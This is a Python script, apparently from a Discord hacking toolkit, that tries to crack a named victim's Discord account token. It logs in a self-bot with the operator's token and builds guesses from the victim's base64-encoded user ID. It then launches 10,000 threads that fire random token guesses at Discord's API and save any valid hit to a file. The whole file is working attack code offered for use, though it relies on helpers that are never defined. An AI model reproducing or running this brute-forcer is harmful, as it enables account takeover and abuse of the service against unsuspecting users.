import string, discord, os, json, datetime, random, time, base64, ctypes
import requests as req
from threading import Thread as thr
from colorama import Fore
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification

def brutforce():
  os.system(f'title Token BrutForce - Made by Astraa')
  os.system('cls')
  brutforcetitle()
  print(f"""{y}[{w}+{y}]{w} Enter your own account token: """)
  TOKEN = str(input(f"""\n{y}[{b}#{y}]{w} Token: """))

  def notifyMe(title, message):
    notification.notify(
      title = title,
      message = message
      )

  class MyClient(discord.Client):
    async def on_ready(self):
      print(f"""\n\n{y}[{w}+{y}]{w} Enter the Victim's ID: """)
      userid = input(f"""\n{y}[{b}#{y}]{w} Victim ID: """)
      try:
        global user
        user = await client.fetch_user(int(userid))
        stamp = user.created_at
        timestamp = str(time.mktime(stamp.timetuple()))
        encodedBytes = base64.b64encode(userid.encode("utf-8"))
        encodedid = str(encodedBytes, "utf-8")
        encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
        encodedstamp = str(encodedBytes, "utf-8")
        print(f"""\n\n\n\n\n\n\n{y}[{Fore.LIGHTGREEN_EX }+{y}]{w} Attempting to crack {user}'s token""")
        input(f"""{y}[{b}#{y}]{w} Press ENTER to Valid""")
        os.system('cls')
        time.sleep(1)
        for i in range(10000):
          thr(target = gen, args = (encodedid, encodedstamp)).start()
      except:
        print(f"""      {y}[{Fore.LIGHTRED_EX }!{y}]{w} Your entry is invalid !""")
        time.sleep(2)
        os.system('cls')
        main()

  def gen(encodedid, encodedstamp):
    while True:
      second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
      end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
      token = f"{encodedid}.{second}.{end}"
      headers = {'Content-Type': 'application/json', 'authorization': token}
      url = "https://discordapp.com/api/v6/users/@me/library"
      r = req.get(url, headers=headers)
      if r.status_code == 200:
          print(f'{token} : Valid')
          notifyMe(f"""{w}[{Fore.GREEN}!{w}]{Fore.GREEN} VALID TOKEN{w} : {token}""")
          f = open("temp/BrutForceToken.txt", "a")
          f.write(token)
          f.close() 
          main()
      else:
          print(f"""{w}[{Fore.RED}!{w}]{Fore.RED} INVALID TOKEN{w} : {token}""")

  try:
    token = os.environ.get(TOKEN)
    client = MyClient()
    client.run(TOKEN, bot=False)
  except:
    print(f"""      {y}[{Fore.LIGHTRED_EX }!{y}]{w} There is a problem with your Token.""")
    time.sleep(2)
    os.system('cls')
    main()

brutforce()